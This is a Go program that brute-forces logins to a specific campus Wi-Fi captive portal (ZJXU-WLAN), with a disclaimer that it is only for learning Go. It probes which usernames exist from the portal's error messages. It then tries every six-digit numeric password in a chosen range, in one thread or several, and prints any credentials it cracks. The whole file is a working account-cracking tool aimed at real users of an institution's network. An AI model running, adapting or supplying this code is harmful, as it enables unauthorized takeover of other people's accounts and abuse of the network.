package main

import (
	"fmt"
	"net/http"
	"strings"
	purl "net/url"
	"io"
	"strconv"
	"math"
	"time"
)

var (
	loginurl  = `http://172.17.0.3/eportal/InterFace.do?method=login`
	isfindpwd = false
)

func HttpPost(url string, userid string, pwd string) (retstr string, merr error) { //发送post
	client := &http.Client{}
	var clusterinfo = purl.Values{}
	clusterinfo.Add("userId", userid)
	clusterinfo.Add("password", pwd)
	clusterinfo.Add("operatorPwd", "")
	clusterinfo.Add("operatorUserId", "")
	clusterinfo.Add("validcode", "")
	clusterinfo.Add("service", "%E6%A0%A1%E5%86%85%E6%9C%8D%E5%8A%A1")
	clusterinfo.Add("queryString", "lanuserip%3D76ced83852c05fdc039ed9575376ef4f%26wlanacname%3D284b634df60c7ef2f96af6bdf4912f7b%26ssid%3D%26nasip%3D31794990ed84e290fc7bd9159798b1f8%26snmpagentip%3D%26mac%3D79e8d5a8a43191d6d3c8b8059e604047%26t%3Dwireless-v2%26url%3D2c0328164651e2b4f13b933ddf36628bea622dedcc302b30%26apmac%3D%26nasid%3D284b634df60c7ef2f96af6bdf4912f7b%26vid%3D2045636786f020c2%26port%3Da16fc4eb6656b1ea%26nasportid%3D5b9da5b08a53a540806c821ff7c1438120a6ffceb7ee444db82c1c4e4a2dce28")
	data := clusterinfo.Encode()
	reqest, err := http.NewRequest("POST", url, strings.NewReader(data))
	reqest.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	reqest.Header.Set("Referer", "http://172.17.0.3/eportal/index.jsp?wlanuserip=76ced83852c05fdc039ed9575376ef4f&wlanacname=284b634df60c7ef2f96af6bdf4912f7b&ssid=&nasip=31794990ed84e290fc7bd9159798b1f8&snmpagentip=&mac=79e7d5a8a43191d6d3ccb8059e604947&t=wireless-v2&url=2c0328164651e2b4f13b933ddf36628bea622dedcc302b30&apmac=&nasid=284b634df60c7ef2f96af6bdf4912f7b&vid=2045636786f020c2&port=a16fc4eb6656b1ea&nasportid=5b9da5b08a53a540806c821ff7c1438120a6ffceb7ee444db82c1c4e4a2dce28")
	if err != nil {
		fmt.Println("发送失败!")
		merr = err;
		return
		//panic(err)
	}
	//处理返回结果
	response, _ := client.Do(reqest)
	res := make([]byte, 2048)
	if _, merr = response.Body.Read(res); merr != nil && merr != io.EOF {
		//返回的状态码
		//status := response.StatusCode
		fmt.Println("解析结果失败:", merr)
		return
	}
	merr = nil
	retstr = string(res)
	//fmt.Println(retstr)
	return
}

func isaccountexist(userid string) (ise bool, err error) { //账号是否存在
	str, err := HttpPost(loginurl, userid, "2")
	if err != nil {
		fmt.Println(err)
		return
	} else {
		if strings.Index(str, "不存在") != -1 {
			ise = false
			return
		}
		if strings.Index(str, "已经在线") != -1 {
			ise = true
			return
		}
		if strings.Index(str, "密码不匹配") != -1 {
			ise = true
			return
		}
	}
	return
}

func ismatch(userid, pwd string) (ism bool, err error) { //id和密码是否匹配
	str, err := HttpPost(loginurl, userid, pwd)
	if err != nil {
		fmt.Println(err)
		return
	} else {
		if strings.Index(str, "不存在") != -1 {
			err = fmt.Errorf("用户名不存在")
			return
		}
		if strings.Index(str, "密码不匹配") != -1 {
			ism = false
			return
		}
		if strings.Index(str, "已经在线") != -1 {
			ism = false
			//fmt.Println("账号已经在线,无法暴破")
			err = fmt.Errorf("账号已经在线,无法暴破")
			return
		}
		if strings.Index(str, `result":"success`) != -1 {
			ism = true
			return
		}
	}
	return
}

func less(str1, str2 string) (isless bool, err error) { //第一个字符串的数字是否小于第二个
	n1, n2 := 0, 0
	n1, err = strconv.Atoi(str1)
	if err != nil {
		return
	}
	n2, err = strconv.Atoi(str2)
	if err != nil {
		return
	}
	return n1 < n2, err
}

func baopo(userid, spwd, epwd string) (pwd string, iss bool, err error) { //暴破(id,[起始密码，结束密码))
	il := false
	if il, err = less(spwd, epwd); !il {
		err = fmt.Errorf("起始密码应小于结束密码")
		return
	}
	if err != nil {
		return
	}
	ism := false
	pch := make(chan string, 10)
	go producepwd(spwd, epwd, pch) //开始生成密码
	cpwd := getnextpwd(pch)
	for f, _ := less(cpwd, epwd); f && !isfindpwd; cpwd = getnextpwd(pch) {
		fmt.Println("正在测试", userid, "-", cpwd)
		ism, err = ismatch(userid, cpwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if ism {
			pwd = cpwd
			fmt.Println("暴破成功,账号:", userid, " 密码:", cpwd)
			iss = true
			isfindpwd = true
			return
		}
		f, _ = less(cpwd, epwd)
		//time.Sleep(1000 * time.Millisecond)
	}
	return
}
func addpwd(pwd string) (npwd string, err error) { //密码+1
	n := 0
	n, err = strconv.Atoi(pwd)
	if err != nil {
		return
	}
	npwd = fmt.Sprintf("%06d", n+1)
	return
}
func splitpwd(spwd, epwd string, num int) (plist []string, err error) { //将密码均匀分割
	ns, ne := 0, 0
	ns, err = strconv.Atoi(spwd)
	if err != nil {
		return
	}
	ne, err = strconv.Atoi(epwd)
	if err != nil {
		return
	}
	if ns > ne {
		err = fmt.Errorf("起始密码不能大于结束密码")
		return
	}
	nd := ne - ns
	_ = nd
	plist = make([]string, num+1)
	plist[0] = spwd
	for i := 1; i < num; i++ {
		a := math.Floor(float64(nd) / float64(num) * float64(i))
		p := int(a) + ns
		//fmt.Println(p)
		plist[i] = fmt.Sprintf("%06d", p)
	}
	plist[num] = epwd
	return
}

func inputidpwd() (id, spwd, epwd string) {
LABEL_IPTID:
	fmt.Println("输入要测试暴破的账号")
	fmt.Scanf("%s\n", &id)
	if len(id) == 0 {
		fmt.Println("账号不能为空")
		goto LABEL_IPTID
	}
	fmt.Println("输入暴破起始密码(默认010000)")
	fmt.Scanf("%s\n", &spwd)
	if len(spwd) == 0 {
		spwd = "010000"
	}
	fmt.Println("输入暴破结束密码(默认319999)")
	fmt.Scanf("%s\n", &epwd)
	if len(epwd) == 0 {
		epwd = "319999"
	}
	return
}

func sglth() { //单线程
	id, spwd, epwd := inputidpwd()
	fmt.Println(id, spwd, epwd)
	ts := time.Now()
	_, _, err := baopo(id, spwd, epwd)
	te := time.Now()
	td := te.Sub(ts)
	fmt.Println("运行完毕,耗时:", td)
	if err != nil {
		fmt.Println(err)
	}
}

func mtlth() { //多线程
	id, spwd, epwd := inputidpwd()
	maxthread := 3
	pl, _ := splitpwd(spwd, epwd, maxthread)
	for i := 0; i < maxthread; i++ {
		ps, pe := pl[i], pl[i+1]
		//fmt.Println(ps,pe)
		go baopo(id, ps, pe)
	}
	ts := time.Now()
	for !isfindpwd {
		time.Sleep(1000 * time.Millisecond)
	}
	te := time.Now()
	td := te.Sub(ts)
	fmt.Println("耗时:", td)
}

func producepwd(spwd, epwd string, ch chan<- string) { //生产密码
	f, err := less(spwd, epwd)
	for cpwd := spwd; f; cpwd, err = addpwd(cpwd) {
		if err != nil {
			panic(err)
		}
		ch <- fmt.Sprintf("%06s", cpwd)
		f, err = less(cpwd, epwd)
		if err != nil {
			panic(err)
		}
	}
}

func getnextpwd(ch <-chan string) (pwd string) { //从密码通道中取出一个密码
	pwd = <-ch
	return
}

func main() {
	fmt.Println("本程序仅供交流学习Go语言使用,请勿用于任何商业以及非法用途" +
		",否则产生一切后果与本人无关")
	fmt.Println("本软件开源,项目地址:" +
		"https://github.com/sleepinging/StudyGolang/tree/master/NetTest/zjxuwifi")
	fmt.Println("请确保现在已经连上ZJXU-WLAN")
	sglth()
	fmt.Println("按回车键退出")
	tmp := ""
	fmt.Scanf("%s\n", &tmp)
}
